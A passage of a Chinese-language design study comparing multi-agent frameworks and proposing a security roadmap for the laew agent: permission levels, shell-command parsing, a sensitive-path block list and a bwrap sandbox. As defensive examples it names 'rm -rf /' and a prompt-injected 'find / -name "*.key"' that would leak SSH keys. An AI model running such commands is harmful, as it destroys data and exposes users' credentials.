const MAX_FAILED_CONSULTS: u32 = 3;  // 失败咨询上限

impl AdvisorGate {
    pub async fn consult(&self, scope: Scope, request: Request) -> Decision {
        if self.failed_count[scope] >= MAX_FAILED_CONSULTS {
            return Decision::Stop;  // 顾问连续失败 → 停止咨询
        }
        if self.reviews_count[scope] >= self.config.max_reviews {
            return Decision::Approve;  // 预算耗尽 → 默认通过
        }
        match self.advisor.consult(request).await {
            Ok(decision) => decision,
            Err(e) => {
                self.failed_count[scope] += 1;
                if self.config.fail_open {
                    Decision::Approve  // 顾问挂了 → 默认通过（不退化）
                } else {
                    Decision::Reject   // 顾问挂了 → 拒绝（保守）
                }
            }
        }
    }
}
```

**3 个关键参数**：
- **max_reviews**：每个 scope（bench/session/instance）的最大审查次数——防止无限重试。
- **MAX_FAILED_CONSULTS = 3**：连续失败上限——防止顾问故障时把 max_reviews 悄悄消耗完。
- **fail_open**：顾问故障时默认 APPROVE 还是 REJECT——前者保证可用性，后者保证安全性。

**对 laew QC 的借鉴**：
- **laew 当前 QC 无限重试**（`docs/Agent源码调研/Switchyard-深度分析.md` 12.3.4 节）——容易因 QC Agent 自身故障导致任务卡死。
- **建议引入 `AdvisorGate`**：QC 失败 3 次 → 标记为「QC 不可用」→ 自动 APPROVE + 告警。

### 5.5 跨项目 HITL 对比

| 维度 | jiuwenswarm | agent-studio | Switchyard | laew |
|------|-------------|--------------|------------|------|
| **挂起点数量** | 3（Pipeline 配置） | N（workflow_state） | 0（预算替代） | 0 |
| **挂起粒度** | 阶段 | 节点 | 预算 | - |
| **状态序列化** | `serialize_for_resume()` | `WorkflowAgentState` | 无 | 无 |
| **三段式 API** | `extract_data/on_resume/next_stage` | 自由 | 自由 | - |
| **跨 Session 恢复** | 支持（payload 持久化） | 支持（state 持久化） | 无 | 无 |
| **失败回流** | 重派上一阶段 | PendingNode 重试 | fail_open / fail_closed | 无 |


---

## 六、Fork 上下文与跨边界重建

### 6.1 ForkContext 的 4 个核心属性

agent-core 的 `ForkContext` 设计极简但完整：

```python
@dataclass
class ForkContext:
    parent_session_id: str           # 父 Agent 的会话 ID
    parent_messages: list[dict]      # 继承的消息列表（已截断 last-N）
    forked_at: datetime              # fork 时间戳
    forked_support_*: Any            # 扩展字段（tools/prompts/skills）
```

**关键设计**：
- **`parent_session_id` 反向追踪**：子 Agent 可向父回传消息（A2A 协议用）。
- **`parent_messages` 截断**：默认 last-20 条，避免上下文爆炸。
- **`forked_support_*` 扩展点**：支持 `forked_support.tools`、`forked_support.prompts`、`forked_support.skills` 等可继承资源。

### 6.2 Fork vs Inherit vs Cold Start

| 维度 | Fork | Inherit | Cold Start |
|------|------|---------|------------|
| **上下文** | 父 last-N 消息 | 完整继承 | 空 |
| **工具集** | 父工具的子集 | 完全继承 | 默认 |
| **记忆** | 可选共享 | 完全共享 | 无 |
| **权限** | **衰减**（默认降低权限） | 完全继承 | 默认 |
| **开销** | 中（序列化 + 重建） | 高（引用共享） | 低 |
| **风险** | 中（权限错配） | 高（权限蔓延） | 低 |

**为什么 Fork 要权限衰减**：
- 子 Agent 不应该比父有更多权限。
- 经典反模式：父 Agent 只能读 `~/work/`，子 Agent 被 fork 后「继承」所有权限——但子 Agent 可能不知道边界。
- **衰减策略**：父 → 子权限只减不增（如父有 Read，子的子子 Agent 只能 Read 已 Fork 的文件）。

### 6.3 laew 当前的 Fork 缺口

laew 没有显式的 Fork 机制——SubAgent 启动时拿到的是「**空上下文**」：

```rust
// src/agent/mod.rs::run_session 伪代码
async fn run_session(session: &mut Session, user_msg: UserMessage) -> Result<()> {
    // SubAgent 启动时只有当前 user_msg + system_prompt
    // 完全没有父 Yolo/Main-Work 的对话历史
    // ...
}
```

**问题**：
- **上下文断裂**：SubAgent 不知道 Yolo 之前讨论过什么，可能重复分析。
- **意图丢失**：父 Agent 把任务简化为一句话「修这个 bug」，SubAgent 不知道原始意图。
- **权限不衰减**：SubAgent 继承父的全部工具权限（包括 Bash 无校验）。

**借鉴方案**：
- 引入 `ForkContext` 结构（Rust 对应 `#[derive(Serialize, Deserialize)]` 的 struct）。
- SubAgent 启动前序列化父 session 的 last-N 消息（带 `<<<LAEW:FORK_BOUNDARY>>>` 标记）。
- SubAgent 启动时反序列化 + 注入「父意图摘要」到 system_prompt 前缀。

---

## 七、协议矩阵（A2A/ACP/E2A/A2UI）差异实现

### 7.1 协议矩阵总览

| 协议 | jiuwenswarm | agent-core | Switchyard | laew 当前 |
|------|-------------|------------|------------|-----------|
| **A2A (Agent↔Agent)** | JSON dict + request_id | 直接函数调用（无协议） | `Algorithm` trait | 直接函数调用（无协议） |
| **ACP (Agent↔CLI)** | JSON-RPC 2.0 over stdio | ExternalCli 双 Spawn | HTTP/wire format | 无 |
| **E2A (External↔Agent)** | WebSocket + Pydantic | 无 | HTTP | 无 |
| **A2UI (Agent↔UI)** | Tagged JSON `<<<`/`>>>` | 无 | Axum WebSocket | 无 |

### 7.2 E2A 的双层 Fallback

jiuwenswarm 的 E2A 协议为「**外部客户端 ↔ Agent**」通信，有**双层 fallback**：

```python
def _fallback_wire_unary_from_legacy(data: dict, rid: str) -> E2AEnvelope:
    """从失败的 legacy 整包重建 envelope。
    双层 fallback:
    1. to_dict 失败 → envelope 包 E2A error
    2. 整层 encode 失败 → legacy 包 fallback（接收端再倒出来）
    """
    try:
        e2a = E2AResponse.from_dict(dict(data))
        return e2a.to_envelope()
    except Exception as e:
        logger.exception("[E2A][wire][in][FAIL] stage=from_dict unary request_id=%s err=%s", rid, e)
        # fallback: metadata 里塞 legacy 包，envelope status=FAILED
        return E2AEnvelope(
            status=FAILED,
            response_kind=E2A_RESPONSE_KIND_E2A_ERROR,
            metadata={E2A_WIRE_LEGACY_AGENT_RESPONSE_KEY: data},
        )
```

**为什么需要双层 fallback**：
- **协议在演进**：新协议版本上线后，旧客户端用 legacy 格式发送。
- **单层 fallback 会丢消息**：如果直接抛异常，消息完全丢失。
- **双层 fallback 保消息**：legacy 包塞到 metadata，接收端再倒出来——保证**消息不丢 + 协议可演进**。

### 7.3 ACP stdio JSON-RPC

ACP（Agent Communication Protocol）是**异构 Agent 协作的行业标准**：

```python
async def spawn_acp_agent(spec: AgentSpec) -> AsyncIterator[ACPResponse]:
    """Spawn an ACP-compatible agent and exchange JSON-RPC 2.0 over subprocess stdio."""
    proc = await asyncio.create_subprocess_exec(
        spec.executable,
        "--acp-mode",
        stdin=PIPE,
        stdout=PIPE,
        stderr=PIPE,
    )
    
    # 写入 JSON-RPC 请求
    request = {"jsonrpc": "2.0", "method": "process", "params": {...}, "id": 1}
    proc.stdin.write(json.dumps(request).encode() + b"\n")
    await proc.stdin.drain()
    
    # 读取 JSON-RPC 响应（line-delimited JSON）
    while True:
        line = await proc.stdout.readline()
        if not line:
            raise RuntimeError(f"ACP agent process exited ({proc.returncode}) while waiting for response")
        response = json.loads(line)
        yield response
```

**关键设计**：
- **JSON-RPC 2.0**：行业标准协议，TypeScript/Rust/Python 都有 client 库。
- **stdio line-delimited JSON**：每行一个 JSON 对象，简单且跨平台。
- **同步阻塞 + 异步迭代**：写入请求 → 迭代读取响应 → 处理。

### 7.4 A2UI 的 Tagged JSON

UI 协议用 `<<<OPEN_TAG>>>` / `<<<CLOSE_TAG>>>` 包裹每个 block：

```python
class A2UIProtocolSpec:
    A2UI_OPEN_TAG = "<<<"
    A2UI_CLOSE_TAG = ">>>"
    
    def parse_response(self, content: str) -> list[A2UIResponsePart]:
        parts = []
        cursor = 0
        while cursor < len(content):
            start = content.find(A2UI_OPEN_TAG, cursor)
            if start == -1:
                break
            body_start = start + len(A2UI_OPEN_TAG)
            end = content.find(A2UI_CLOSE_TAG, body_start)
            if end == -1:
                break
            body = content[body_start:end]
            parts.append(A2UIResponsePart.from_tagged(body))
            cursor = end + len(A2UI_CLOSE_TAG)
        return parts
```

**优势**：
- **增量解析**：UI 端可逐步渲染，无需等完整响应。
- **嵌套友好**：`<<<chart:bar>>>...<<<chart:line>>>...<<<chart:close>>>>>>` 自然支持嵌套。
- **与自然语言共存**：非 Tagged 内容直接当文本渲染，混合 UI block 和纯文本。

### 7.5 laew 的协议空白

**当前完全无协议层**：
- Yolo 与 SubAgent 之间：直接函数调用，无消息边界。
- SubAgent 与 Tool 之间：直接函数调用，无 wire format。
- TUI 主屏与子屏之间：内存对象传递，无协议版本。

**演进路径**：
- **P0**：引入「**LAEW Agent Message Envelope**」——最小 wire format：`{from, to, kind, payload, version}`。
- **P1**：A2UI 协议——TUI 渲染从纯文本升级到结构化 UI block（图表、按钮、表单）。
- **P2**：ACP stdio——支持外部 CLI 工具作为 Agent 成员（`./laew --member <name>`）。

---

## 八、质量门控（QC）的精细化分级

### 8.1 5 个项目的 QC 形态对比

| 项目 | QC 形态 | 触发时机 | 检查项 | 失败回流 | 精细化分级 |
|------|---------|----------|--------|----------|------------|
| **laew** | Quality-Check Agent | 每个 SubAgent 完成后 | LLM-as-Judge 评分 | 重派 SubAgent | 无（无限重试） |
| **agent-core** | 铁轨 AFTER_INVOKE | 工具调用后 | 自定义钩子 | 局部重试 | 钩子可注册多级 |
| **Switchyard** | AdvisorGate | 关键决策点 | 配置审查 + budget | `max_reviews` 耗尽后通过 | **3 级（bench/session/instance）** |
| **jiuwenswarm** | REVIEW 阶段 + Benchmark | Pipeline 阶段 | LLM-as-Judge + 自动化 benchmark | 重派上一阶段 | 阶段级 |
| **agent-studio** | workflow_state.review | workflow 节点 | 自定义钩子 | PendingNode 重试 | 节点级 |

### 8.2 Switchyard AdvisorGate 的 3 级预算

```rust
pub enum Scope {
    Bench,    // 整批 bench 测试共享预算
    Session,  // 单次会话
    Instance, // 单个 LLM 调用实例
}

pub struct AdvisorGateConfig {
    pub max_reviews: u32,           // 每个 scope 的最大审查次数
    pub fail_open: bool,            // 顾问失败时默认 APPROVE
    pub max_failed_consults: u32,   // 顾问连续失败上限
}
```

**为什么 3 级而不是 1 级全局预算**：
- **Bench 级**：整批测试（如 100 个 case 共享 10 次审查）——防止某个 case 消耗所有预算。
- **Session 级**：单次用户交互的审查次数——防止一次会话里无限制审查。
- **Instance 级**：单个 LLM 调用的审查次数——防止单次调用内死循环。

**关键参数**：
- **`max_reviews=3`**：每个 scope 最多 3 次审查。
- **`max_failed_consults=3`**：顾问连续失败 3 次后停止咨询。
- **`fail_open=true`**：顾问故障时默认 APPROVE——保证可用性。

### 8.3 agent-core 的铁轨 vs laew QC

**铁轨（agent-core）**：
- `@rail(before=..., after=..., on_exception=...)` 装饰器。
- **多铁轨可注册**：日志铁轨 + 限流铁轨 + 缓存铁轨 + QC 铁轨。
- **钩子可短路**：铁轨可修改 ctx 或抛异常跳过实际调用。

**QC（laew）**：
- 独立 Quality-Check Agent，有自己的 system_prompt 和工具集。
- **单一决策点**：QC Agent 跑完后返回一个评分。
- **无铁轨机制**：日志、限流、缓存都散落在主循环里。

**借鉴方案**：
- 引入 `Rail` trait（Rust）：
  ```rust
  #[async_trait]
  pub trait Rail: Send + Sync {
      fn name(&self) -> &str;
      async fn before_model_call(&self, ctx: &mut RailContext) -> RailAction;
      async fn after_model_call(&self, ctx: &mut RailContext, response: &LlmResponse) -> RailAction;
      async fn on_exception(&self, ctx: &mut RailContext, err: &AgentError) -> RailAction;
  }
  ```
- QC Agent 实现 Rail trait，作为 `after_model_call` 钩子。
- 其他横切关注点（日志、限流、缓存）也实现 Rail trait，组成「**铁轨链**」。

### 8.4 质量门控的精细化分级

**借鉴 Switchyard + agent-core 的混合方案**：

| 层级 | 触发时机 | 决策者 | 上限 |
|------|----------|--------|------|
| **L0: Tool Guard** | 工具调用前 | `PermissionEngine.check_permission()` | 无 |
| **L1: SubAgent QC** | SubAgent 完成后 | Quality-Check Agent（LLM-as-Judge） | `max_reviews=3` |
| **L2: Workflow Gate** | 整个 workflow 完成后 | AdvisorGate（多 reviewer 并行） | `max_reviews=2` |
| **L3: Human Review** | 关键决策点（hard 任务发布前） | 用户 | 无限 |

**为什么分 4 层**：
- **L0 是机器检查**（快、严格、零开销）。
- **L1 是 LLM 检查**（中、灵活、有 token 开销）。
- **L2 是多 reviewer 共识**（慢、精准、有 token 成本）。
- **L3 是人工确认**（慢、人工成本）。

每层检查颗粒度递增，开销递增，**默认只走 L0 + L1，L2 按需触发，L3 仅关键决策点**。

---

## 九、可观测性与审计

### 9.1 三个项目的可观测性对比

| 项目 | 轨迹格式 | Trace | Metrics | 审计日志 |
|------|----------|-------|---------|----------|
| **agent-core** | **OTLP Trajectory**（不可变） | OTLP JSON | 无 | `[PermissionEngine]` 日志 |
| **TencentDB-Agent-Memory** | **Langfuse + Opik** 双 trace | OpenTelemetry | 无 | 双 trace 服务 |
| **Switchyard** | 自定义 `Step` 流 | **W3C Trace Context** | **Prometheus** | 结构化日志 |
| **jiuwenswarm** | `[E2A][wire][in]` 日志 | 无 | 无 | 完整 wire 日志 |
| **laew** | `tracing` 日志 | 无 | 无 | 简单 `tracing` |

### 9.2 agent-core OTLP Trajectory

```python
class Trajectory:
    """不可变值对象，拥有单一 OTLP 轨迹有效载荷"""
    __slots__ = ("_payload", "_sealed")
    _sealed: bool
    
    @property
    def payload(self) -> dict:
        if not self._sealed:
            raise AttributeError("Trajectory not sealed")
        return self._payload
    
    def __setattr__(self, key, value):
        if getattr(self, "_sealed", False):
            raise AttributeError("Trajectory is immutable")
        super().__setattr__(key, value)
```

**设计要点**：
- **`__slots__` + `_sealed`**：对象一旦 sealed 就不可修改，支持安全共享。
- **OTLP 标准格式**：使用 OpenTelemetry Protocol JSON，可直接对接 Jaeger/Tempo。
- **`__setattr__` 拦截**：所有写操作抛 `AttributeError`——防御性设计。

### 9.3 TencentDB-Agent-Memory 双 Trace

```python
class MemoryRouter:
    def __init__(self):
        self.langfuse_client = Langfuse()    # 主 trace
        self.opik_client = Opik()           # 备份 trace
    
    async def trace(self, span_name: str, metadata: dict):
        # 同时发送到两个服务（高可用 + 跨服务对比）
        await asyncio.gather(
            self.langfuse_client.trace(span_name, metadata),
            self.opik_client.trace(span_name, metadata),
        )
```

**为什么双 trace**：
- **高可用**：一个 trace 服务挂了，另一个仍记录。
- **跨服务对比**：用 Langfuse 看业务指标，用 Opik 做 A/B 实验。
- **数据隔离**：生产用 Langfuse（合规），研究用 Opik（灵活）。

### 9.4 Switchyard Prometheus + W3C Trace Context

```rust
// Prometheus 指标注册
let metrics_handle = PrometheusBuilder::new()
    .install_recorder()
    .map_err(|error| format!("failed to initialize Prometheus metrics: {error}"))?;

// W3C Trace Context 注入
let parent = TraceContextPropagator::new().extract(&HeaderExtractor(headers));
let span = tracer.start_with_context("route_request", parent);
```

**W3C Trace Context 传播链**：
```
Client → Switchyard → Upstream LLM
   │          │              │
   └─traceparent: 0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01
              │
              └─traceparent: 0af7651916cd43dd8448eb211c80319c-b9c7c989f97918e1-01
                             │
                             └─(LLM 内部 trace)
```

**优势**：
- **跨服务追踪**：traceparent header 在整个调用链传递。
- **OpenTelemetry 兼容**：W3C 标准，主流 trace 后端都支持。
- **采样可控**：traceparent 第 4 段（flags）决定是否采样。

### 9.5 laew 可观测性演进路径

**P0**：结构化 `tracing` 日志——`tracing-subscriber` + JSON formatter，每条日志带 `session_id`/`agent_name`/`stage`。

**P1**：W3C Trace Context 注入——在 HTTP 客户端（`LlmClient`）请求头加 `traceparent`。

**P2**：Prometheus exporter——暴露 `laew_qc_pass_total`/`laew_qc_fail_total`/`laew_tool_call_duration_seconds` 等指标。

**P3**：OTLP Trajectory 落库——把每次 ReAct 循环的 user/assistant/tool 序列写入 `trajectory` 表，为 RL 训练铺路。

---

## 十、Rust vs Python 实现差异

### 10.1 类型系统对权限管控的支持差异

| 维度 | Rust (Switchyard/laew) | Python (agent-core/jiuwenswarm) |
|------|------------------------|----------------------------------|
| **权限枚举** | `enum PermissionLevel { Allow, Ask, Deny }`（穷尽匹配） | `class PermissionLevel(str, Enum)`（运行时检查） |
| **Guard 接口** | `trait Guard: Send + Sync`（编译期检查） | `class ToolGuard`（鸭子类型） |
| **Shell AST** | 需 `tree_sitter` crate（绑定 C lib） | `tree-sitter` Python 包（pip install） |
| **命名空间** | `nix` crate（绑定 unshare 系统调用） | `os.unshare()` 或 subprocess |
| **Seccomp** | `libseccomp-sys` / `seccompiler` crate | `ctypes` 内联加载器（代码生成） |
| **编译期安全** | **模式匹配穷尽性、trait bound、所有权** | 无（运行期 NameError） |

### 10.2 Switchyard 的 Rust 模式

**Algorithm trait + Step 流**：

```rust
#[async_trait]
pub trait Algorithm: Send + Sync {
    fn run_stream(self: Arc<Self>, request: Request) -> StepStream;
}

pub enum Step {
    CallModel(CallRequest),
    Done(Outcome),
}

// 默认实现
fn run_stream(self: Arc<Self>, request: Request) -> StepStream {
    let (tx, rx) = mpsc::channel(16);
    tokio::spawn(async move {
        let result = AssertUnwindSafe(self.execute(request))
            .catch_unwind()
            .await;
        let _ = tx.send(result).await;
    });
    ReceiverStream::new(rx)
}
```

**Rust 优势**：
- **`Arc<dyn Algorithm>`** trait object——多态算法统一调度。
- **`AssertUnwindSafe + catch_unwind`**——跨 await 抓 panic，防止算法崩溃拖死 host。
- **`mpsc::channel<Result<Step>>`**——host 提供 serve 闭包，算法反向控制流。

### 10.3 agent-core 的 Python 装饰器模式

```python
@rail(before=BEFORE_MODEL_CALL, after=AFTER_MODEL_CALL, on_exception=ON_MODEL_EXCEPTION)
async def _railed_model_call(ctx):
    return await actual_llm_call(ctx)

@steerable  # 允许在运行中注入指令
class ReActAgent(BaseAgent):
    @force_finish  # 优雅退出钩子
    async def step(self, ctx):
        ...
```

**Python 优势**：
- **装饰器组合**：`@rail + @steerable + @force_finish` 自由组合。
- **运行时元编程**：装饰器可修改类、注入方法、注册钩子。
- **Duck typing**：无需声明接口，灵活性高。

### 10.4 类型系统对权限管控的支持

**Rust 的编译期保护**：
```rust
// 编译期强制所有 PermissionLevel 都被处理
match engine.check_permission(tool_call) {
    PermissionLevel::Allow => execute(),
    PermissionLevel::Ask => prompt_user(),
    PermissionLevel::Deny => return Err(PermissionDenied),
}
// 漏写一个分支 → 编译错误
```

**Python 的运行期保护**：
```python
# 运行期才检查，漏写一个分支不会报错
level = engine.check_permission(tool_call)
if level == PermissionLevel.ALLOW:
    execute()
elif level == PermissionLevel.ASK:
    prompt_user()
# 漏写 DENY 分支 → 静默通过 → 安全隐患
```

**laew 借鉴**：
- 用 Rust 的 `enum` 实现 `PermissionLevel`，**编译期保证穷尽性**。
- 用 `match` 而非 `if-elif`，**漏分支即编译错误**。
- 未来加新权限级别时，所有匹配点会被强制更新。

### 10.5 trait vs 鸭子类型的取舍

| 维度 | Rust trait | Python 鸭子类型 |
|------|------------|------------------|
| **接口定义** | 显式 `trait Guard { fn check(); }` | 隐式（任何类只要有 `check()` 方法就行） |
| **错误检测** | 编译期（trait 未实现 → 编译错误） | 运行期（方法不存在 → AttributeError） |
| **可扩展性** | 需修改 trait 定义 | 直接传任何对象 |
| **可发现性** | 编译器告诉你哪里缺实现 | grep 才知道谁用了 |

**laew 借鉴**：
- 对**核心抽象**（Guard、Rail、Sandbox）用 trait——保证扩展安全。
- 对**辅助工具**（Hook、Filter）保留鸭子类型——保留灵活性。

---


## 十一、laew 现状诊断

### 11.1 协作层诊断

| 维度 | 当前实现 | 缺失项 | 风险等级 |
|------|----------|--------|----------|
| **多 Agent 编排** | `MultiAgentOrchestrator` 串行（Yolo→Plan→Main→Sub→QC→Session） | 无并发、无状态机、无动态路由 | 低（功能正确，但效率低） |
| **Fork 上下文** | 无 | SubAgent 启动拿不到父消息 | **高**（子 Agent 重复分析） |
| **HITL 挂起** | 无 | Plan 产出方案无用户确认点 | 中（hard 任务失败率高） |
| **协议层** | 直接函数调用 | 无消息边界、无 wire format | 低（单进程内可接受） |
| **失败回流** | QC 不通过 → 重派 Sub | 无重试上限、无失败计数器 | 中（QC 故障 → 任务卡死） |

### 11.2 权限层诊断（最严重）

| 维度 | 当前实现 | 缺失项 | 风险等级 |
|------|----------|--------|----------|
| **Bash 工具** | 直接 `tokio::process::Command` 执行 | **零校验** | **极高**（可 `rm -rf /`） |
| **Read 工具** | 任意路径读取 | 无敏感路径黑名单（`~/.ssh`、`/etc/shadow`） | **高** |
| **Write 工具** | 任意路径写入 | 无路径白名单 | **高** |
| **三态决策** | 无 | 无 Allow/Ask/Deny 枚举 | 极高 |
| **Shell AST 解析** | 无 | 命令直接拼接给 shell | 极高 |
| **MCP 白名单** | 无（当前无 MCP） | 无 server 维度控制 | 低（暂无 MCP） |
| **铁轨机制** | 无 | 横切关注点（限流、缓存、审计）散落 | 中 |
| **fail-closed** | N/A | N/A | N/A |

**最严重的具体场景**：
```rust
// src/agent/tools/bash.rs 当前实现（简化）
impl Tool for BashTool {
    async fn execute(&self, args: BashArgs) -> Result<BashResult> {
        // 直接执行，无任何校验
        let output = tokio::process::Command::new("sh")
            .arg("-c")
            .arg(&args.command)
            .output()
            .await?;
        Ok(BashResult { stdout: output.stdout, stderr: output.stderr })
    }
}
```

**用户输入**: `"查看 ~/work 目录的代码结构"`
**LLM 真实执行**: `find / -name "*.key" | head -100`（模型幻觉或被 prompt injection 诱导）

**当前行为**：直接执行 → 用户 SSH 私钥泄露到 stdout → LLM 把密钥当文本返回 → 写入对话历史。

### 11.3 沙箱层诊断

| 维度 | 当前实现 | 缺失项 | 风险等级 |
|------|----------|--------|----------|
| **命名空间** | 无 | 共享宿主机 PID/UID/Network | 极高 |
| **Seccomp** | 无 | 无系统调用过滤 | 极高 |
| **文件系统只读** | 无 | 可写任意路径 | 极高 |
| **网络隔离** | 无 | 可访问任意 URL | 高 |
| **用户隔离** | 无 | 继承当前用户 UID | 高 |
| **retcode 检测** | 无 | 无法识别安全违规 | 中 |
| **PR_SET_PDEATHSIG** | 无 | 父死子成孤儿 | 中 |

### 11.4 综合风险评级

```
┌────────────────────────────────────────────────────────┐
│ 风险评估（5 个仓库对比，laew 现状）                       │
├────────────────────────────────────────────────────────┤
│ 安全合规风险     ██████████████████  9/10 (零沙箱零权限)  │
│ 多 Agent 协作    ████████░░░░░░░░░░  4/10 (基础可用)    │
│ HITL 体验        █████░░░░░░░░░░░░░  3/10 (无挂起点)    │
│ 故障恢复         █████░░░░░░░░░░░░░  3/10 (QC 无上限)    │
│ 可观测性         ████░░░░░░░░░░░░░░  2/10 (仅 tracing)  │
│ 协议成熟度       ███░░░░░░░░░░░░░░░  1.5/10 (无协议)    │
└────────────────────────────────────────────────────────┘
```

**结论**：**安全合规是 laew 最大的当务之急**（5 个仓库中唯一零基础）。协作层有基本架构但缺乏 Fork/HITL；可观测性是次要缺口。

---

## 十二、P0/P1/P2 演进路线图

### 12.1 P0 — 立即实施（1-2 周，最大 ROI）

#### P0-1：三态权限枚举 + 基础校验（5d）

```rust
// 新增 src/agent/security/permission.rs
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PermissionLevel {
    Allow,
    Ask,
    Deny,
}

#[async_trait]
pub trait PermissionGuard: Send + Sync {
    fn name(&self) -> &str;
    async fn check(&self, tool_call: &ToolCall, ctx: &PermissionContext) -> PermissionLevel;
}

// 三级防护
pub struct PermissionEngine {
    tool_guard: ToolGuard,
    file_guard: FileGuard,
    net_guard: Option<NetGuard>,  // 未来 HTTP 工具
}

impl PermissionEngine {
    pub fn check_permission(&self, call: &ToolCall, ctx: &PermissionContext) -> PermissionLevel {
        let checks = [
            self.tool_guard.check(call, ctx),
            self.file_guard.check(call, ctx),
        ];
        checks.into_iter().fold(PermissionLevel::Allow, strictest)
    }
}

fn strictest(a: PermissionLevel, b: PermissionLevel) -> PermissionLevel {
    match (a, b) {
        (PermissionLevel::Deny, _) | (_, PermissionLevel::Deny) => PermissionLevel::Deny,
        (PermissionLevel::Ask, _) | (_, PermissionLevel::Ask) => PermissionLevel::Ask,
        _ => PermissionLevel::Allow,
    }
}
```

**适用对象**：`BashTool`、`ReadTool`、`WriteTool` 三工具调用前必走 check。

**TUI 集成**：Ask 时弹出 `[ 允许 / 拒绝 / 始终允许 ]` 按钮。

#### P0-2：Bash 工具 Shell AST 双后端（5d）

```rust
// 引入 tree_sitter_bash crate
// 新增 src/agent/security/shell_ast.rs

pub fn parse_bash_command(command: &str) -> ShellAstParseResult {
    match tree_sitter_bash::parse(command) {
        Ok(ast) => analyze_ast(&ast),
        Err(_) => {
            // fail-closed：tree-sitter 不可用时用保守扫描器
            conservative_scan(command)
        }
    }
}

fn conservative_scan(command: &str) -> ShellAstParseResult {
    let risky_patterns = ["&&", "||", "|", ";", "$(", "`", ">", "<", "&"];
    if risky_patterns.iter().any(|p| command.contains(p)) {
        ShellAstParseResult {
            status: ParseStatus::ParseUnavailable,
            reason: "tree-sitter unavailable and risky structure detected",
        }
    } else {
        ShellAstParseResult { status: ParseStatus::Safe }
    }
}
```

**Bash 工具集成**：
```rust
impl Tool for BashTool {
    async fn execute(&self, args: BashArgs, ctx: &ToolContext) -> Result<BashResult> {
        // 1. 权限检查
        let level = ctx.permission_engine.check_permission(...);
        match level {
            PermissionLevel::Deny => return Err(PermissionDenied),
            PermissionLevel::Ask => if !ctx.ui.confirm(&format!("允许执行: {}", args.command))? {
                return Err(UserDenied);
            },
            PermissionLevel::Allow => {}
        }
        
        // 2. AST 解析
        let ast = parse_bash_command(&args.command);
        if ast.status == ParseStatus::ParseUnavailable {
            ctx.log("[PermissionEngine] shell_ast.parse_unavailable");
            // 降级到更严格的 ASK
        }
        
        // 3. 执行
        tokio::process::Command::new("sh").arg("-c").arg(&args.command).output().await
    }
}
```

#### P0-3：敏感路径黑名单（2d）

```rust
pub struct FileGuard {
    sensitive_paths: Vec<PathBuf>,  // ~/.ssh, /etc/shadow, /proc, /sys
    workspace_root: PathBuf,        // 工作目录白名单
}

impl PermissionGuard for FileGuard {
    async fn check(&self, call: &ToolCall, _ctx: &PermissionContext) -> PermissionLevel {
        if let Some(path) = call.extract_path() {
            // 1. 符号链接解析
            let canonical = std::fs::canonicalize(&path).unwrap_or(path);
            
            // 2. 敏感路径检查
            for sensitive in &self.sensitive_paths {
                if canonical.starts_with(sensitive) {
                    return PermissionLevel::Deny;
                }
            }
            
            // 3. 工作目录白名单检查
            if !canonical.starts_with(&self.workspace_root) {
                return PermissionLevel::Ask;
            }
        }
        PermissionLevel::Allow
    }
}
```

**敏感路径列表**：
```rust
vec![
    dirs::home_dir().unwrap().join(".ssh"),
    dirs::home_dir().unwrap().join(".gnupg"),
    dirs::home_dir().unwrap().join(".aws"),
    PathBuf::from("/etc/shadow"),
    PathBuf::from("/etc/passwd"),
    PathBuf::from("/proc"),
    PathBuf::from("/sys"),
]
```

#### P0-4：BubbleWrap 沙箱（Bash/Read/Write 工具级，5d）

```rust
// 新增 src/agent/sandbox/mod.rs
#[async_trait]
pub trait Sandbox: Send + Sync {
    fn sandbox_type(&self) -> &str;
    async fn execute(&self, cmd: &str, args: &[&str]) -> Result<SandboxResult>;
}

// BubbleWrap 实现
pub struct BubbleWrapSandbox {
    config: BubbleWrapConfig,
}

#[async_trait]
impl Sandbox for BubbleWrapSandbox {
    async fn execute(&self, cmd: &str, args: &[&str]) -> Result<SandboxResult> {
        let mut bwrap_args = vec!["bwrap"];
        bwrap_args.extend(self._namespace_params());
        bwrap_args.extend(self._bind_params());
        bwrap_args.extend(["--", cmd]);
        bwrap_args.extend(args);
        
        let output = tokio::process::Command::new("bwrap")
            .args(&bwrap_args)
            .output()
            .await?;
        
        // retcode=159 检测
        if output.status.code() == Some(159) {
            return Err(SandboxError::BadSyscall);
        }
        
        Ok(SandboxResult { stdout: output.stdout, stderr: output.stderr })
    }
}
```

**集成到 BashTool**：
```rust
impl Tool for BashTool {
    async fn execute(&self, args: BashArgs, ctx: &ToolContext) -> Result<BashResult> {
        if ctx.config.enable_sandbox {
            self.sandbox.execute("sh", &["-c", &args.command]).await
        } else {
            // 无沙箱模式（仅 dev 环境）
            self.direct_execute(&args.command).await
        }
    }
}
```

#### P0-5：QC `max_reviews` 预算（3d）

```rust
pub struct QcGate {
    max_reviews: u32,              // 默认 3
    fail_open: bool,               // 默认 true
    fail_counters: HashMap<Uuid, u32>,
}

impl QcGate {
    pub async fn check(&mut self, task_id: Uuid, result: &SubAgentResult) -> QcDecision {
        let reviews = self.review_counters.entry(task_id).or_insert(0);
        if *reviews >= self.max_reviews {
            return QcDecision::Approve;  // 预算耗尽 → 默认通过
        }
        *reviews += 1;
        
        match self.qc_agent.evaluate(result).await {
            Ok(decision) => decision,
            Err(_) => {
                let fails = self.fail_counters.entry(task_id).or_insert(0);
                *fails += 1;
                if *fails >= 3 || !self.fail_open {
                    QcDecision::Reject  // 连续失败或保守模式
                } else {
                    QcDecision::Approve  // fail_open
                }
            }
        }
    }
}
```

**P0 阶段总工期**：约 20 天，3 个特性并行。

---

### 12.2 P1 — 中期实施（1-2 月）

#### P1-1：Fork 上下文序列化（4d）

引入 `ForkContext` struct（Rust 实现）：

```rust
#[derive(Serialize, Deserialize)]
pub struct ForkContext {
    pub parent_session_id: SessionId,
    pub parent_messages: Vec<Message>,    // last-N（默认 20）
    pub forked_at: DateTime<Utc>,
    pub forked_support: ForkSupport,      // tools/prompts/skills 子集
}

#[derive(Serialize, Deserialize, Default)]
pub struct ForkSupport {
    pub tools: Option<Vec<String>>,
    pub prompts: Option<Vec<String>>,
    pub skills: Option<Vec<String>>,
}
```

**SubAgent 启动流程**：
```rust
impl MultiAgentOrchestrator {
    async fn delegate_to_sub(&self, parent: &Session, task: SubTask) -> Result<SubResult> {
        let fork_ctx = ForkContext {
            parent_session_id: parent.id,
            parent_messages: parent.context.messages().iter().rev().take(20).cloned().collect(),
            forked_at: Utc::now(),
            forked_support: ForkSupport {
